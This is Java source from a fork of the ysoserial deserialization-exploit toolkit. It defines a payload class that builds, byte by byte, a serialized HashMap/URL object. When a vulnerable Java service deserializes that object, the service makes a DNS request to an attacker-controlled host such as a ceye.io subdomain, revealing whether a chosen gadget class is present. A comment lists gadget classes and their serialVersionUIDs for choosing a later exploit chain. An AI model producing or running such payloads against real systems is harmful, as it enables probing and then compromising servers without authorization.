package ysoserial.payloads;

import static java.io.ObjectStreamConstants.STREAM_MAGIC;
import static java.io.ObjectStreamConstants.STREAM_VERSION;
import static java.io.ObjectStreamConstants.TC_BLOCKDATA;
import static java.io.ObjectStreamConstants.TC_CLASS;
import static java.io.ObjectStreamConstants.TC_CLASSDESC;
import static java.io.ObjectStreamConstants.TC_ENDBLOCKDATA;
import static java.io.ObjectStreamConstants.TC_NULL;
import static java.io.ObjectStreamConstants.TC_OBJECT;
import static java.io.ObjectStreamConstants.TC_REFERENCE;
import static java.io.ObjectStreamConstants.TC_STRING;
import static java.io.ObjectStreamConstants.baseWireHandle;

import java.net.URL;
import java.util.HashMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Converter;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;

/**
 * 随便弄弄，版本没测，可以用 ysoserial.SuidLookup 跑
 *
 * [
 *     {
 *         "class":"net.sf.json.JSONObject",
 *         "suid":-5159560445913960199,
 *         "desc":"net.sf.json-lib:json-lib:jdk15"
 *     },
 *     {
 *         "class":"org.apache.commons.collections.map.LazyMap",
 *         "suid":7990956402564206740,
 *         "desc":"commons-collections:commons-collections"
 *     },
 *     {
 *         "class":"com.sun.syndication.feed.impl.ObjectBean",
 *         "suid":-9036182525298043830,
 *         "desc":"rome:rome"
 *     },
 *     {
 *         "class":"org.apache.commons.collections.functors.ChainedTransformer",
 *         "suid":3514945074733160196,
 *         "desc":"commons-collections:commons-collections"
 *     },
 *     {
 *         "class":"org.apache.commons.collections.keyvalue.TiedMapEntry",
 *         "suid":-8453869361373831205,
 *         "desc":"commons-collections:commons-collections"
 *     },
 *     {
 *         "class":"org.apache.commons.collections4.functors.InstantiateTransformer",
 *         "suid":3786388740793356347,
 *         "desc":"org.apache.commons:commons-collections"
 *     },
 *     {
 *         "class":"org.apache.commons.beanutils.BeanComparator",
 *         "suid":-2044202215314119608,
 *         "desc":"commons-beanutils:commons-beanutils"
 *     },
 *     {
 *         "class":"com.mchange.v2.c3p0.PoolBackedDataSource",
 *         "suid":-2440162180985815128,
 *         "desc":"com.mchange:c3p0"
 *     },
 *     {
 *         "class":"org.mozilla.javascript.NativeJavaObject",
 *         "suid":-6948590651130498591,
 *         "desc":"rhino:js"
 *     },
 *     {
 *         "class":"bsh.Interpreter",
 *         "suid":-3957541217794112454,
 *         "desc":"org.beanshell:bsh"
 *     },
 *     {
 *         "class":"org.apache.commons.fileupload.disk.DiskFileItem",
 *         "suid":2237570099615271025,
 *         "desc":"commons-fileupload:commons-fileupload"
 *     },
 *     {
 *         "class":"org.apache.commons.collections4.bag.TreeBag",
 *         "suid":-7740146511091606676,
 *         "desc":"org.apache.commons:commons-collections"
 *     },
 *     {
 *         "class":"org.codehaus.groovy.runtime.ConvertedClosure",
 *         "suid":1162833713450835227,
 *         "desc":"org.codehaus.groovy:groovy"
 *     },
 *     {
 *         "class":"org.jboss.weld.interceptor.spi.model.InterceptionModel",
 *         "suid":3800260388412693137,
 *         "desc":"org.jboss.weld:weld-core"
 *     },
 *     {
 *         "class":"org.apache.commons.collections4.comparators.TransformingComparator",
 *         "suid":3456940356043606220,
 *         "desc":"org.apache.commons:commons-collections"
 *     },
 *     {
 *         "class":"org.jboss.interceptor.reader.ReflectiveClassMetadata",
 *         "suid":-2088679292389273922,
 *         "desc":"org.jboss.interceptor:jboss-interceptor-core"
 *     },
 *     {
 *         "class":"org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression",
 *         "suid":-2847633717581167765,
 *         "desc":"org.apache.myfaces.core:myfaces-impl"
 *     },
 *     {
 *         "class":"com.vaadin.data.util.NestedMethodProperty",
 *         "suid":6242635371098225051,
 *         "desc":"com.vaadin:vaadin-server"
 *     },
 *     {
 *         "class":"org.python.core.PyBytecode",
 *         "suid":-6010342697849248238,
 *         "desc":"org.python:jython-standalone"
 *     },
 *     {
 *         "class":"org.hibernate.property.Getter",
 *         "suid":397515195902559519,
 *         "desc":"org.hibernate:hibernate-core"
 *     }
 * ]
 *
 * 用于检测反序列化环境中存在的class，主要利用URLDNS的gadget进行check
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies()
public class CheckClassURLDNS implements ObjectPayload<byte[]> {

	public byte[] getObject(final String ... command) throws Exception {
        byte[] bytes = Converter.toBytes(getData(command[0], command[1], command.length > 2 ? Long.parseLong(command[2]) : null));
		return bytes;
	}

    static Object[] getData(String dnsServer, String className, Long suid) throws Exception {
        int offset = 0;
        Object[] firstObj = new Object[]{
            STREAM_MAGIC, STREAM_VERSION,
            TC_OBJECT,
            TC_CLASSDESC,
            HashMap.class.getName(),
            362498820763181265L,
            (byte) 3,
            (short) 2,
            (byte) 'F', "loadFactor",
            (byte) 'I', "threshold",
            TC_ENDBLOCKDATA,
            TC_NULL,

            0.75F,
            12,

            TC_BLOCKDATA,
            (byte) 8,
            16,
            2,
        };
        Object[] secondObj;
        if (suid == null) {
            secondObj = new Object[] {
                Class.forName(className),
                TC_NULL,
            };
            offset += 3;
        } else {
            secondObj = new Object[] {
                TC_CLASS,
                TC_CLASSDESC,
                className,
                suid,
                (byte) 2,
                (short) 0,
                TC_ENDBLOCKDATA,
                TC_NULL,
                TC_NULL,
            };
            offset += 5;
        }
        Object[] thirdObj = new Object[] {
            TC_OBJECT,
            TC_CLASSDESC,
            URL.class.getName(),
            -7627629688361524110L,
            (byte) 3,
            (short) 7,
            (byte) 'I', "hashCode",
            (byte) 'I', "port",
            (byte) 'L', "authority", TC_STRING, String[].class.getName(),
            (byte) 'L', "file", TC_REFERENCE, baseWireHandle + offset,
            (byte) 'L', "host", TC_REFERENCE, baseWireHandle + offset,
            (byte) 'L', "protocol", TC_REFERENCE, baseWireHandle + offset,
            (byte) 'L', "ref", TC_REFERENCE, baseWireHandle + offset,
            TC_ENDBLOCKDATA,
            TC_NULL,

            -1,
            -1,
            TC_STRING, dnsServer,
            TC_STRING, "",
            TC_STRING, dnsServer,
            TC_STRING, "http",
            TC_NULL,
            TC_ENDBLOCKDATA,

            new String[] {"http://" + dnsServer},
            TC_ENDBLOCKDATA,
        };
        Object[] finalObj = new Object[firstObj.length + secondObj.length + thirdObj.length];
        System.arraycopy(firstObj, 0, finalObj, 0, firstObj.length);
        System.arraycopy(secondObj, 0, finalObj, firstObj.length, secondObj.length);
        System.arraycopy(thirdObj, 0, finalObj, firstObj.length + secondObj.length, thirdObj.length);
        return finalObj;
    }

	public static boolean isApplicableJavaVersion() {
	    JavaVersion v = JavaVersion.getLocalVersion();
	    return v != null && (v.major < 8 || (v.major == 8 && v.update <= 20));
	}

	public static void main(final String[] args) throws Exception {
        // args:
        // lazymap.******.ceye.io   org.apache.commons.collections.map.LazyMap
        // or
        // lazymap.******.ceye.io   org.apache.commons.collections.map.LazyMap  7990956402564206740
		PayloadRunner.run(CheckClassURLDNS.class, args);
	}
}
